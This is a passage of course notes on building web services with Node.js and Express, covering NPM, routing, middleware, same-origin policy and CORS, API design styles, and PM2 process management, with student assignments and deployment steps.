We can execute the JavaScript by passing the file to node, and receive the following result.
➜  node index.js
Counting ... 1
Counting ... 2
Counting ... 3
Counting ... 4
Counting ... 5

You can also run node in interpretive mode by executing it without any parameters and then typing your JavaScript code directly into the interpreter.
➜ node
Welcome to Node.js v16.15.1.
> 1+1
2
> console.log('hello')
hello

Node package manager
While you could write all of the JavaScript for everything you need, it is always helpful to use preexisting packages of JavaScript for implementing common tasks. To load a package using Node.js you must take two steps. First install the package locally on your machine using the Node Package Manager (NPM), and then include a require statement in your code that references the package name. NPM is automatically installed when you install Node.js.
NPM knows how to access a massive repository of preexisting packages. You can search for packages on the NPM website. However, before you start using NPM to install packages you need to initialize your code to use NPM. This is done by creating a directory that will contain your JavaScript and then running npm init. NPM will step you through a series of questions about the project you are creating. You can press the return key for each of questions if you want to accept the defaults. If you are always going to accept all of the defaults you can use npm init -y and skip the Q&A.
➜  mkdir npmtest
➜  cd npmtest
➜  npm init -y

Package.json
If you list the files in the directory you will notice that it has created a file named package.json. This file contains three main things: 1) Metadata about your project such as its name and the default entry JavaScript file, 2) commands (scripts) that you can execute to do things like run, test, or distribute your code, and 3) packages that this project depends upon. The following shows what your package.json looks like currently. It has some default metadata and a simple placeholder script that just runs the echo command when you execute npm run test from the console.
{
  "name": "npmtest",
  "version": "1.0.0",
  "description": "",
  "main": "index.js",
  "keywords": [],
  "author": "",
  "license": "ISC",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  }
}

With NPM initialized to work with your project, you can now use it to install a node package. As a simple example, we will install a package that knows how to tell jokes. This package is called give-me-a-joke. You can search for it on the NPM website, see how often it is installed, examine the source code, and learn about who created it. You install the package using npm install followed by the name of the package.
➜  npm install give-me-a-joke

If you again examine the contents of the package.json file you will see a reference to the newly installed package dependency. If you decide you no longer want a package dependency you can always remove it with the npm uninstall <package name here> console command.
With the dependency added, the unnecessary metadata removed, the addition of a useful script to run the program, and also adding a description, the package.json file should look like this:
{
  "name": "npmtest",
  "version": "1.0.0",
  "description": "Simple Node.js demo",
  "main": "index.js",
  "license": "MIT",
  "scripts": {
    "dev": "node index.js"
  },
  "dependencies": {
    "give-me-a-joke": "^0.5.1"
  }
}

⚠ Note that when you start installing package dependencies, NPM will create an additional file named package-lock.json and a directory named node_modules in your project directory. The node_modules directory contains the actual JavaScript files for the package and all of its dependent packages. As you install several packages this directory will start to get very large. You do not want to check this directory into your source control system since it can be very large and can be rebuilt using the information contained in the package.json and package-lock.json files. So make sure you include node_modules in your .gitignore file.
When you clone your source code from GitHub to a new location, the first thing you should do is run npm install in the project directory. This will cause NPM to download all of the previously installed packages and recreate the node_modules directory.
The package-lock.json file tracks the version of the package that you installed. That way if you rebuild your node_modules directory you will have the version of the package you initially installed and not the latest available version, which might not be compatible with your code.
With NPM and the joke package installed, you can now use the joke package in a JavaScript file by referencing the package name as a parameter to the require function. This is then followed by a call to the joke object's getRandomDadJoke function to actually generate a joke. Create a file named index.js and paste the following into it.
index.js
const giveMeAJoke = require('give-me-a-joke');
giveMeAJoke.getRandomDadJoke((joke) => {
  console.log(joke);
});

If you run this code using node.js you should get a result similar to the following.
➜  node index.js
What do you call a fish with no eyes? A fsh.

This may seem like a lot of work but after you do it a few times it will begin to feel natural. Just remember the main steps.
Create your project directory
Initialize it for use with NPM by running npm init -y
Make sure .gitignore file contains node_modules
Install any desired packages with npm install <package name here>
Add require('<package name here>') to your application's JavaScript
Use the code the package provides in your JavaScript
Run your code with node index.js
Creating a web service
With JavaScript we can write code that listens on a network port (e.g. 80, 443, 3000, or 8080), receives HTTP requests, processes them, and then responds. We can use this to create a simple web service that we then execute using Node.js.
First create your project.
➜ mkdir webservicetest
➜ cd webservicetest
➜ npm init -y

Now, open VS Code and create a file named index.js. Paste the following code into the file and save.
const http = require('http');
const server = http.createServer(function (req, res) {
  res.writeHead(200, { 'Content-Type': 'text/html' });
  res.write(`<h1>Hello Node.js! [${req.method}] ${req.url}</h1>`);
  res.end();
});

server.listen(8080, () => {
  console.log(`Web service listening on port 8080`);
});

This code uses the Node.js built-in http package to create our HTTP server using the http.createServer function along with a callback function that takes a request (req) and response (res) object. That function is called whenever the server receives an HTTP request. In our example, the callback always returns the same HTML snippet, with a status code of 200, and a Content-Type header, no matter what request is made. Basically this is just a simple dynamically generated HTML page. A real web service would examine the HTTP path and return meaningful content based upon the purpose of the endpoint.
The server.listen call starts listening on port 8080 and blocks until the program is terminated.
We execute the program by going back to our console window and running Node.js to execute our index.js file. If the service starts up correctly then it should look like the following.
➜ node index.js
Web service listening on port 8080

You can now open your browser and point it to localhost:8080 and view the result. The interaction between the JavaScript, node, and the browser looks like this.

Use different URL paths in the browser and note that it will echo the HTTP method and path back in the document. You can kill the process by pressing CTRL-C in the console.
Note that you can also start up Node and execute the index.js code directly in VS Code. To do this open index.js in VS Code and press the 'F5' key. This should ask you what program you want to run. Select node.js. This starts up Node.js with the index.js file, but also attaches a debugger so that you can set breakpoints in the code and step through each line of code.
⚠ Make sure you complete the above steps. For the rest of the course you will be executing your code using Node.js to run your backend code and serve up your frontend code to the browser. This means you will no longer be using the VS Code Live Server extension to serve your frontend code in the browser.
Deno and Bun
You should be aware that Ryan has created a successor to Node.js called Deno. This version is more compliant with advances in ECMAScript and has significant performance enhancements. There are also competitor server JavaScript applications. One of the more interesting rising stars is called Bun. If you have the time you should learn about them.

Express
📖 Deeper dive reading: MDN Express/Node introduction
In the previous instruction you saw how to use Node.js to create a simple web server. This works great for little projects where you are trying to quickly serve up some web content, but to build a production-ready application you need a framework with a bit more functionality for easily implementing a full web service. This is where the Node package Express come in. Express provides support for:
Routing requests for service endpoints
Manipulating HTTP requests with JSON body content
Generating HTTP responses
Using middleware to add functionality
Express was created by TJ Holowaychuk and is currently maintained by the Open.js Foundation.

“People tell you to not reinvent things, but I think you should … it will teach you things”
— TJ Holowaychuk
Everything in Express revolves around creating and using HTTP routing and middleware functions. You create an Express application by using NPM to install the Express package and then calling the express constructor to create the Express application and listen for HTTP requests on a desired port.
➜ npm install express

const express = require('express');
const app = express();

app.listen(8080);

With the app object you can now add HTTP routing and middleware functions to the application.
Defining routes
HTTP endpoints are implemented in Express by defining routes that call a function based upon an HTTP path. The Express app object supports all of the HTTP verbs as functions on the object. For example, if you want to have a route function that handles an HTTP GET request for the URL path /store/provo you would call the get method on the app.
app.get('/store/provo', (req, res, next) => {
  res.send({name: 'provo'});
});

The get function takes two parameters, a URL path matching pattern, and a callback function that is invoked when the pattern matches. The path matching parameter is used to match against the URL path of an incoming HTTP request.
The callback function has three parameters that represent the HTTP request object (req), the HTTP response object (res), and the next routing function that Express expects to be called if this routing function wants another function to generate a response.
The Express app compares the routing function patterns in the order that they are added to the Express app object. So if you have two routing functions with patterns that both match, the first one that was added will be called and given the next matching function in the next parameter.
In our example above we hard coded the store name to be provo. A real store endpoint would allow any store name to be provided as a parameter in the path. Express supports path parameters by prefixing the parameter name with a colon (:). Express creates a map of path parameters and populates it with the matching values found in the URL path. You then reference the parameters using the req.params object. Using this pattern you can rewrite our getStore endpoint as follows.
app.get('/store/:storeName', (req, res, next) => {
  res.send({name: req.params.storeName});
});

If we run our JavaScript using node we can see the result when we make an HTTP request using curl.
➜ curl localhost:8080/store/orem
{"name":"orem"}

If you wanted an endpoint that used the POST or DELETE HTTP verb then you just use the post or delete function on the Express app object.
The route path can also include a limited wildcard syntax or even full regular expressions in path pattern. Here are a couple route functions using different pattern syntax.
// Wildcard - matches /store/x and /star/y
app.put('/st*/:storeName', (req, res) => res.send({update: req.params.storeName}));

// Pure regular expression
app.delete(/\/store\/(.+)/, (req, res) => res.send({delete: req.params[0]}));

Notice that in these examples the next parameter was omitted. Since we are not calling next we do not need to include it as a parameter. However, if you do not call next then no following middleware functions will be invoked for the request.
Using middleware
📖 Deeper dive reading: Express Middleware
The standard Mediator/Middleware design pattern has two pieces: a mediator and middleware. Middleware represents componentized pieces of functionality. The mediator loads the middleware components and determines their order of execution. When a request comes to the mediator it then passes the request around to the middleware components. Following this pattern, Express is the mediator, and middleware functions are the middleware components.
Express comes with a standard set of middleware functions. These provide functionality like routing, authentication, CORS, sessions, serving static web files, cookies, and logging. Some middleware functions are provided by default, and other ones must be installed using NPM before you can use them. You can also write your own middleware functions and use them with Express.
A middleware function looks very similar to a routing function. That is because routing functions are also middleware functions. The only difference is that routing functions are only called if the associated pattern matches. Middleware functions are always called for every HTTP request unless a preceding middleware function does not call next. A middleware function has the following pattern:
function middlewareName(req, res, next)

The middleware function parameters represent the HTTP request object (req), the HTTP response object (res), and the next middleware function to pass processing to. You should usually call the next function after completing processing so that the next middleware function can execute.

Creating your own middleware
As an example of writing your own middleware, you can create a function that logs out the URL of the request and then passes on processing to the next middleware function.
app.use((req, res, next) => {
  console.log(req.originalUrl);
  next();
});

Remember that the order that you add your middleware to the Express app object controls the order that the middleware functions are called. Any middleware that does not call the next function after doing its processing, stops the middleware chain from continuing.
Builtin middleware
In addition to creating your own middleware functions, you can use a built-in middleware function. Here is an example of using the static middleware function. This middleware responds with static files, found in a given directory, that match the request URL.
app.use(express.static('public'));

Now if you create a subdirectory in your project directory and name it public you can serve up any static content that you would like. For example, you could create an index.html file that is the default content for your web service. Then when you call your web service without any path the index.html file will be returned.
Third party middleware
You can also use third party middleware functions by using NPM to install the package and including the package in your JavaScript with the require function. The following uses the cookie-parser package to simplify the generation and access of cookies.
➜ npm install cookie-parser

const cookieParser = require('cookie-parser');

app.use(cookieParser());

app.post('/cookie/:name/:value', (req, res, next) => {
  res.cookie(req.params.name, req.params.value);
  res.send({cookie: `${req.params.name}:${req.params.value}`});
});

app.get('/cookie', (req, res, next) => {
  res.send({cookie: req.cookies});
});

It is common for middleware functions to add fields and functions to the req and res objects so that other middleware can access the functionality they provide. You see this happening when the cookie-parser middleware adds the req.cookies object for reading cookies, and also adds the res.cookie function in order to make it easy to add a cookie to a response.
Error handling middleware
You can also add middleware for handling errors that occur. Error middleware looks similar to other middleware functions, but it takes an additional err parameter that contains the error.
function errorMiddlewareName(err, req, res, next)

If you wanted to add a simple error handler for anything that might go wrong while processing HTTP requests you could add the following.
app.use(function (err, req, res, next) {
  res.status(500).send({type: err.name, message: err.message});
});

We can test that our error middleware is getting used by adding a new endpoint that generates an error.
app.get('/error', (req, res, next) => {
  throw new Error('Trouble in river city');
});

Now if we use curl to call our error endpoint we can see that the response comes from the error middleware.
➜ curl localhost:8080/error
{"type":"Error","message":"Trouble in river city"}

Putting it all together
Here is a full example of our web service built using Express.
const express = require('express');
const cookieParser = require('cookie-parser');
const app = express();

// Third party middleware - Cookies
app.use(cookieParser());

app.post('/cookie/:name/:value', (req, res, next) => {
  res.cookie(req.params.name, req.params.value);
  res.send({cookie: `${req.params.name}:${req.params.value}`});
});

app.get('/cookie', (req, res, next) => {
  res.send({cookie: req.cookies});
});

// Creating your own middleware - logging
app.use((req, res, next) => {
  console.log(req.originalUrl);
  next();
});

// Built in middleware - Static file hosting
app.use(express.static('public'));

// Routing middleware
app.get('/store/:storeName', (req, res) => {
  res.send({name: req.params.storeName});
});

app.put('/st*/:storeName', (req, res) => res.send({update: req.params.storeName}));

app.delete(/\/store\/(.+)/, (req, res) => res.send({delete: req.params[0]}));

// Error middleware
app.get('/error', (req, res, next) => {
  throw new Error('Trouble in river city');
});

app.use(function (err, req, res, next) {
  res.status(500).send({type: err.name, message: err.message});
});

// Listening to a network port
const port = 8080;
app.listen(port, function () {
  console.log(`Listening on port ${port}`);
});

☑ Assignment
Create a web service with Express using the following steps.
Open your console.
Create a directory named testExpress, and change into that directory
mkdir testExpress
cd testExpress


Initialize the directory for use with NPM.
npm init -y


Install the express and cookie-parser packages.
npm install express cookie-parser


Create a file named index.js and paste the example code given above.
Create a directory named public and add an index.html file with some basic html to the directory.
mkdir public
print '<h1>Hello express</h1>' > public/index.html


Run your web service using node (node index.js)
node index.js


Open another console window and use Curl to try out your web service by making requests to the endpoints.
curl localhost:8080
curl localhost:8080/error
curl localhost:8080/store/orem
curl -X PUT localhost:8080/st/orem
curl -X DELETE localhost:8080/store/orem
curl -X POST -c cookies.txt localhost:8080/cookie/express/tj
curl -b cookies.txt localhost:8080/cookie


Develop a mental model in your head about what these commands are doing and how your service is responding. Perhaps creating a sequence diagram will help clarify the interaction if it is still unclear.

When you are done executing the above commands, copy the output from the curl commands and paste it into the Canvas a

Simon Service

This deliverable demonstrates converting the JavaScript application into a web application by implementing a web service that listens on a network port for HTTP requests. The web service provides endpoints for getting and updating the scores. The application also uses a couple third party endpoints to display inspirational quotes on the about page and show a random header image.
We will use Node.js and Express to create our HTTP service.
You can view this application running here: Example Simon Service

Service endpoint definitions
Here is our design, documented using curl commands, for the two endpoints that the Simon web service provides.
GetScores - Get the latest high scores.
curl -X GET /api/scores

#Response
{ "scores":[
  {"name":"Harvey", "score":"337", "date":"2022/11/20"},
  {"name":"도윤 이", "score":"95", "date":"2019/05/20"}
]}

SubmitScore - Submit a score for consideration in the list of high scores.
curl -X POST /api/score -d '{"name":"Harvey", "score":"337", "date":"2022/11/20"}'

#Response
{ "scores":[
  {"name":"Harvey", "score":"337", "date":"2022/11/20"},
  {"name":"도윤 이", "score":"95", "date":"2019/05/20"}
]}

Third party endpoints
The about.js file contains code for making calls to third party endpoints using fetch. We make one call to picsum.photos to get a random picture and another to quotable.io to get a random quote. Once the endpoint asynchronously returns, the DOM is updated with the requested data. Here is an example of the quote endpoint call.
function displayQuote(data) {
  fetch('https://api.quotable.io/random')
    .then((response) => response.json())
    .then((data) => {
      const containerEl = document.querySelector('#quote');

      const quoteEl = document.createElement('p');
      quoteEl.classList.add('quote');
      const authorEl = document.createElement('p');
      authorEl.classList.add('author');

      quoteEl.textContent = data.content;
      authorEl.textContent = data.author;

      containerEl.appendChild(quoteEl);
      containerEl.appendChild(authorEl);
    });
}

Steps to convert Simon to a service
Converting Simon to a service involved the following steps.
Move all the previous deliverable code files (_.html, _.js, *.css, favicon.ico, and assets) into a sub-directory named public. We will use the HTTP Node.js based service to host the frontend application files. This is done with the static file middleware that we will add our service index.js.
app.use(express.static('public'));
When running our service the static file middleware takes care of reading the frontend code from the public directory and returning it to the browser. The service only directly handles the endpoint requests.

Within the project directory run npm init -y. This configures the directory to work with node.js.
Modify or create .gitignore to ignore node_modules.
Install the Express package by running npm install express. This will write the Express package dependency in the package.json file and install all the Express code to the node_modules directory.
Create a file named index.js in the root of the project. This is the entry point that node.js will call when you run your web service.
Add the basic Express JavaScript code needed to host the application static content and the desired endpoints.
const express = require('express');
const app = express();

// The service port. In production the frontend code is statically hosted by the service on the same port.
const port = process.argv.length > 2 ? process.argv[2] : 3000;

// JSON body parsing using built-in middleware
app.use(express.json());

// Serve up the frontend static content hosting
app.use(express.static('public'));

// Router for service endpoints
const apiRouter = express.Router();
app.use(`/api`, apiRouter);

// GetScores
apiRouter.get('/scores', (_req, res) => {
  res.send(scores);
});

// SubmitScore
apiRouter.post('/score', (req, res) => {
  scores = updateScores(req.body, scores);
  res.send(scores);
});

// Return the application's default page if the path is unknown
app.use((_req, res) => {
  res.sendFile('index.html', { root: 'public' });
});

app.listen(port, () => {
  console.log(`Listening on port ${port}`);
});


Modify the Simon application code to make service endpoint requests to our newly created HTTP service code.
async function loadScores() {
  const response = await fetch("/api/scores")
  const scores = await response.json()

  // Modify the DOM to display the scores


Study this code
Get familiar with what the example code teaches.
Clone the repository to your development environment.
git clone https://github.com/webprogramming260/simon-service.git


Review the code and get comfortable with everything it represents.
Debug the code in your browser by hosting it from a VS Code debug session. This video on debugging a node.js based service will step you through the process.
⚠ You will no longer use the live server extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in index.js. Set breakpoints in your backend code inside of VS Code.
Use the browser's dev tools to set breakpoints in the frontend code and step through it each line.
Make modifications to the code as desired. Experiment and see what happens.
Deploy to production
Deploy to your production environment using a copy of the deployService.sh script found in the example class application. Take some time to understand how it works.
./deployService.sh -k <yourpemkey> -h <yourdomain> -s simon
For example,
./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s simon
⚠ NOTE - The deployment script for this project is different from previous deployment scripts, since it needs to set up the Node.js service for your backend code, and copy your frontend code to the public directory. You also want to make sure that your Node.js HTTP service code for Simon is configured to listen on port 3000. When you deploy your Startup you want to make sure that code is configured to listen on port 4000.
Update your startup repository notes.md with what you learned.
Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).
Startup Service
Now that you have learned how to use and create services, it is time to add backend support to your startup application. The main things you should focus on in this deliverable include serving up your frontend code through Node.js, calling third party services, and providing your own service endpoints.
You must use the same startup GitHub repository that you created in the earlier instruction. Update the notes.md file with things that you learn as you work on your startup. As you make changes to your HTML, CSS, and JavaScript, commit those changes and push them to GitHub. You will need at least ten commits to get full credit, but in reality you should have many more than that.
Remember to use the browser's debugger window to debug your frontend HTML, CSS and JavaScript. You can also debug your backend service JavaScript running on Node.js using the built in VS Code Node.js debugger. You should no longer be using the VS Code Live Server extension to serve up your frontend code to the browser since your Node.js server code should now do that.
Once you have developed your application to where you want it, you need to release it to your production environment. Replace your previous startup deployment script with a copy of the deployService.sh script from the Simon Service repository and use startup for the service parameter (-s).
./deployService.sh -k <yourpemkey> -h <yourdomain> -s startup

For example,
./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s startup

Doing this will make this deliverable of your startup available from https://startup.yourdomainname.
☑ Assignment
Review and deploy Simon Service
Clone the Simon Service repository to your development environment.
Run npm install in the root of the project.
Open the project in VS Code and examine the application's use of Node.js, Express, and JavaScript to create service endpoints.
Execute in your development environment by debugging the application using VS Code's Node.js debugger (press F5 while viewing index.js). Set breakpoints in VS Code and step through the backend JavaScript.
Open your browser to http://localhost:3000 and use the browser's dev tools to step through the frontend JavaScript using the Source tab.
Deploy to your production environment using the deployment script so that it is available with your domain's simon subdomain.
Convert your startup application into a web service using Node.js and Express.
Serve up your frontend code using the Express static middleware.
Provide endpoints for your service.
Call your endpoints from your frontend code.
Call third party endpoints from your frontend code. This can be as simple as displaying a quote like Simon does.
Debug your application using VS Code's Node debugger and the browser's dev tools, in your development environment, to verify it is working correctly.
Periodically commit and push your code to GitHub.
Periodically update your startup repository's notes.md file to reflect what you have learned and want to remember.
Push your final version of your project to GitHub.
Deploy your startup application to your production environment (your server).
Make sure your application is available from your production environment.
Upload the URL to your startup application to the Canvas assignment.
Grading Rubric
Prerequisite: Simon Service deployed to your production environment
Prerequisite: A link to your GitHub startup repository prominently displayed on your application's home page
Prerequisite: Notes in your startup Git repository README.md file documenting what you modified and added with this deliverable. The TAs will only grade things that have been clearly described as being completed. Review the voter app as an example.
Prerequisite: At least 10 git commits spread consistently throughout the assignment period.
Backend web service support and interaction
40% - Create an HTTP service using Node.js and Express
10% - Frontend served up using Express static middleware
10% - Your frontend calls third party service endpoints
20% - Your backend provides service endpoints
20% - Your frontend calls your service endpoints
Go celebrate
You did it! This is a significant milestone. Time to grab some friends, show them what you did, and celebrate by watching a movie with popcorn 🍿.
SOP and CORS
📖 Deeper dive reading:
MDN Same origin policy
MDN Cross origin resource sharing
Security should always be on your mind when you are working with the web. The ability to provide services to a global audience makes the information on the web very valuable, and therefore an attractive target for nefarious parties. When website architecture and browser clients were still in their infancy they allowed JavaScript to make requests from one domain while displaying a website from a different domain. These are called cross-origin requests.
Consider the following example. An attacker sends out an email with a link to a hacker website (byu.iinstructure.com) that is similar to the real course website. Notice the additional i. If the hacker website could request anything from the real website then it could make itself appear and act just like the real education website. All it would have to do is request images, html, and login endpoints from the course's website and display the results on the hacker website. This would give the hacker access to everything the user did.
To combat this problem the Same Origin Policy (SOP) was created. Simply stated SOP only allows JavaScript to make requests to a domain if it is the same domain that the user is currently viewing. A request from byu.iinstructure.com for service endpoints that are made to byu.instructure.com would fail because the domains do not match. This provides significant security, but it also introduces complications when building web applications. For example, if you want build a service that any web application can use it would also violate the SOP and fail. In order to address this, the concept of Cross Origin Resource Sharing (CORS) was invented.
CORS allows the client (e.g. browser) to specify the origin of a request and then let the server respond with what origins are allowed. The server may say that all origins are allowed, for example if they are a general purpose image provider, or only a specific origin is allowed, for example if they are a bank's authentication service. If the server doesn't specify what origin is allowed then the browser assumes that it must be the same origin.
Going back to our hacker example, the HTTP request from the hacker site (byu.iinstructure.com) to the course's authentication service (byu.instructure.com) would look like the following.
GET /api/auth/login HTTP/2
Host: byu.instructure.com
Origin: https://byu.iinstructure.com

In response the course website would return:
HTTP/2 200 OK
Access-Control-Allow-Origin: https://byu.instructure.com

The browser would then see that the actual origin of the request does not match the allowed origin and so the browser blocks the response and generates an error.
Notice that with CORS, it is the browser that is protecting the user from accessing the course website's authentication endpoint from the wrong origin. CORS is only meant to alert the user that something nefarious is being attempted. A hacker can still proxy requests through their own server to the course website and completely ignore the Access-Control-Allow-Origin header. Therefore the course website needs to implement its own precautions to stop a hacker from using its services inappropriately.
Using third party services
When you make requests to your own web services you are always on the same origin and so you will not violate the SOP. However, if you want to make requests to a different domain than the one your web application is hosted on, then you need to make sure that domain allows requests as defined by the Access-Control-Allow-Origin header it returns. For example, if I have JavaScript in my web application loaded from cs260.click that makes a fetch request for an image from the website i.picsum.photos the browser will fail the request with an HTTP status code of 403 and an error message that CORS has blocked the request.

That happens because i.picsum.photos does not return an Access-Control-Allow-Origin header. Without a header the browser assumes that all requests must be made from the same origin.
If your web application instead makes a service request to icanhazdadjoke.com to get a joke, that request will succeed because icanhazdadjoke.com returns an Access-Control-Allow-Origin header with a value of * meaning that any origin can make requests to this service.
HTTP/2 200
access-control-allow-origin: *

Did you hear about the bread factory burning down? They say the business is toast.

This would have also succeeded if the HTTP header had explicitly listed your web application domain. For example, if you make your request from the origin cs260.click the following response would also satisfy CORS.
HTTP/2 200
access-control-allow-origin: https://cs260.click

I’ll tell you something about German sausages, they’re the wurst

This all means that you need to test the services you want to use before you include them in your application. Make sure they are responding with * or your calling origin. If they do not then you will not be able to use them.
Service design
Web services provide the interactive functionality of your web application. They commonly authenticate users, track their session state, provide, store, and analyze data, connect peers, and aggregate user information. Making your web service easy to use, performant, and extensible are factors that determine the success of your application. A good design will result in increased productivity, satisfied users, and lower processing costs.
Model and sequence diagrams
When first considering your service design it is helpful to model the application's primary objects and the interactions of the objects. You should attempt to stay as close to the model that is in your user's mind as possible. Avoid introducing a model that focuses on programming constructs and infrastructure. For example, a chat program should model participants, conversations, and messages. It should not model user devices, network connections, and data blobs.
Once you have defined your primary objects you can create sequence diagrams that show how the objects interact with each other. This will help clarify your model and define the necessary endpoints. You can use a simple tool like SequenceDiagram.org to create and share diagrams.

Leveraging HTTP
Web services are usually provided over HTTP, and so HTTP greatly influences the design of the service. The HTTP verbs such as GET, POST, PUT, and DELETE often mirror the designed actions of a web service. For example, a web service for managing comments might list the comments (GET), create a comment (POST), update a comment (PUT), and delete a comment (DELETE). Likewise, the MIME content types defined by IANA are a natural fit for defining the types of content that you want to provide (e.g. HTML, PNG, MP3, and MP4). The goal is to leverage those technologies as much as possible so that you don't have to recreate the functionality they provide and instead take advantage of the significant networking infrastructure built up around HTTP. This includes caching servers that increase your performance, edge servers that bring your content closer, and replication servers that provide redundant copies of your content and make your application more resilient to network failures.

Endpoints
A web service is usually divided up into multiple service endpoints. Each endpoint provides a single functional purpose. All of the criteria that you would apply to creating well designed code functions also applies when exposing service endpoints.

⚠ Note that service endpoints are often called an Application Programming Interface (API). This is a throwback to old desktop applications and the programming interfaces that they exposed. Sometimes the term API refers to the entire collection of endpoints, and sometimes it is used to refer to a single endpoint.
Here are some things you should consider when designing your service's endpoints.
Grammatical - With HTTP everything is a resource (think noun or object). You act on the resource with an HTTP verb. For example, you might have an order resource that is contained in a store resource. You then create, get, update, and delete order resources on the store resource.
Readable - The resource you are referencing with an HTTP request should be clearly readable in the URL path. For example, an order resource might contain the path to both the order and store where the order resource resides: /store/provo/order/28502. This makes it easier to remember how to use the endpoint because it is human readable.
Discoverable - As you expose resources that contain other resources you can provide the endpoints for the aggregated resources. This makes it so someone using your endpoints only needs to remember the top level endpoint and then they can discover everything else. For example, if you have a store endpoint that returns information about a store you can include an endpoint for working with a store in the response.
GET /store/provo  HTTP/2
{
  "id": "provo",
  "address": "Cougar blvd",
  "orders": "https://cs260.click/store/provo/orders",
  "employees": "https://cs260.click/store/provo/employees"
}


Compatible - When you build your endpoints you want to make it so that you can add new functionality without breaking existing clients. Usually this means that the clients of your service endpoints should ignore anything that they don't understand. Consider the two following JSON response versions.
Version 1
{
  "name": "John Taylor"
}
Version 2
{
  "name": "John Taylor",
  "givenName": "John",
  "familyName": "Taylor"
}
By adding a new representation of the name field, you provide new functionality for clients that know how to use the new fields without harming older clients that ignore the new fields and simply use the old representation. This is all done without officially versioning the endpoint.
If you are fortunate enough to be able to control all of your client code you can mark the name field as depreciated and in a future version remove it once all of the clients have upgraded. Usually you want to keep compatibility with at least one previous version of the endpoint so that there is enough time for all of the clients to migrate before compatibility is removed.
Simple - Keeping your endpoints focused on the primary resources of your application helps to avoid the temptation to add endpoints that duplicate or create parallel access to primary resources. It is very helpful to write some simple class and sequence diagrams that outline your primary resources before you begin coding. These resources should focus on the actual resources of the system you are modeling. They should not focus on the data structure or devices used to host the resources. There should only be one way to act on a resource. Endpoints should only do one thing.
Documented - The Open API Specification is a good example of tooling that helps create, use, and maintain documentation of your service endpoints. It is highly suggested that you make use of such tools in order to provide client libraries for your endpoints and a sandbox for experimentation. Creating an initial draft of your endpoint documentation before you begin coding will help you mentally clarify your design and produce a better final result. Providing access to your endpoint documentation along with your production system helps with client implementations and facilitates easier maintenance of the service. The Swagger Petstore example documentation is a reasonable example to follow.
There are many models for exposing endpoints. We will consider three common ones, RPC, REST, and GraphQL.
RPC
Remote Procedure Calls (RPC) expose service endpoints as simple function calls. When RPC is used over HTTP it usually just leverages the POST HTTP verb. The actual verb and subject of the function call is represented by the function name. For example, deleteOrder or updateOrder. The name of the function is either the entire path of the URL or a parameter in the POST body.
POST /updateOrder HTTP/2

{"id": 2197, "date": "20220505"}

or
POST /rpc HTTP/2

{"cmd":"updateOrder", "params":{"id": 2197, "date": "20220505"}}

One advantage of RPC is that it maps directly to function calls that might exist within the server. This could also be considered a disadvantage as it directly exposes the inner workings of the service, and thus creates a coupling between the endpoints and the implementation.
REST
Representational State Transfer (REST) attempts to take advantage of the foundational principles of HTTP. This is not surprising considering the principle author of REST, Roy Fielding, was also a contributor to the HTTP specification. REST HTTP verbs always act upon a resource. Operations on a resource impact the state of the resource as it is transferred by a REST endpoint call. This allows for the caching functionality of HTTP to work optimally. For example, GET will always return the same resource until a PUT is executed on the resource. When PUT is used, the cached resource is replaced with the updated resource.
With REST the updateOrder endpoint would look like the following.
PUT /order/2197 HTTP/2

{"date": "20220505"}

Where the proper HTTP verb is used and the URL path uniquely identifies the resource. These seem like small differences, but maximizing HTTP pays dividends by making it easy for HTTP infrastructure, such as caching, to work properly.
There are several other pieces of Fielding's dissertation on REST, such as hypermedia, that are often quoted as being required for a truly "restful" implementation, and these are just as often ignored.
GraphQL
GraphQL focuses on the manipulation of data instead of a function call (RPC) or a resource (REST). The heart of GraphQL is a query that specifies the desired data and how it should be joined and filtered. GraphQL was developed to address frustration concerning the massive number of REST, or RPC calls, that a web application client needed to make in order to support even a simple UI widget.
Instead of making a call for getting a store, and then a bunch of calls for getting the store's orders and employees, GraphQL would send a single query that would request all of that information in one big JSON response. The server would examine the query, join the desired data, and then filter out anything that was not wanted.
Here is an example GraphQL query.
query {
  getOrder(id: "2197") {
    orders(filter: {date: {allofterms: "20220505"}}) {
      store
      description
      orderedBy
    }
  }
}

GraphQL helps to remove a lot of the logic for parsing endpoints and mapping requests to specific resources. Basically in GraphQL there is only one endpoint. The query endpoint.
The downside of that flexibility is that the client now has significant power to consume resources on the server. There is no clear boundary on what, how much, or how complicated the aggregation of data is. It also is difficult for the server to implement authorization rights to data as they have to be baked into the data schema. However, there are standards for how to define a complex schema. Common GraphQL packages provide support for schema implementations along with database adaptors for query support.
PM2
When you run a program from the console, the program will automatically terminate when you close the console or if the computer restarts. In order to keep programs running after a shutdown you need to register it as a daemon. The term daemon comes from the idea of something that is always there working in the background. Hopefully you only have good daemons running in your background.
We want our web services to continue running as a daemon. We would also like an easy way to start and stop our services. That is what Process Manager 2 (PM2) does.
PM2 is already installed on your production server as part of the AWS AMI that you selected when you launched your server. Additionally, the deployment scripts found with the Simon projects automatically modify PM2 to register and restart your web services. That means you should not need to do anything with PM2. However, if you run into problems such as your services not running, then here are some commands that you might find useful.
You can SSH into your server and see PM2 in action by running the following command.
pm2 ls

This should print out the two services, simon and startup, that are configured to run on your web server.
You can try some of the other commands, but only if you understand what they are doing. Using them incorrectly could cause your web services to stop working.
Command
Purpose
pm2 ls
List all of the hosted node processes
pm2 monit
Visual monitor
pm2 start index.js -n simon
Add a new process with an explicit name
pm2 start index.js -n startup -- 4000
Add a new process with an explicit name and port parameter
pm2 stop simon
Stop a process
pm2 restart simon
Restart a process
pm2 delete simon
Delete a process from being hosted
pm2 delete all
Delete all processes
pm2 save
Save the current processes across reboot
pm2 restart all
Reload all of the processes
pm2 restart simon --update-env
Reload process and update the node version to the current environment definition
pm2 update
Reload pm2
pm2 start env.js --watch --ignore-watch="node_modules"
Automatically reload service when index.js changes
pm2 describe simon
Describe detailed process information
pm2 startup
Displays the command to run to keep PM2 running after a reboot.
pm2 logs simon
Display process logs
pm2 env 0
Display environment variables for process. Use pm2 ls to get the process ID

Registering a new web service
If you want to setup another subdomain that accesses a different web service on your web server, you need to follow these steps.
Add the rule to the Caddyfile to tell it how to direct requests for the domain.
Create a directory and add the files for the web service.
Configure PM2 to host the web service.
Modify Caddyfile
SSH into your server.
Copy the section for the startup subdomain and alter it so that it represents the desired subdomain and give it a different port number that is not currently used on your server. For example:
tacos.cs260.click {
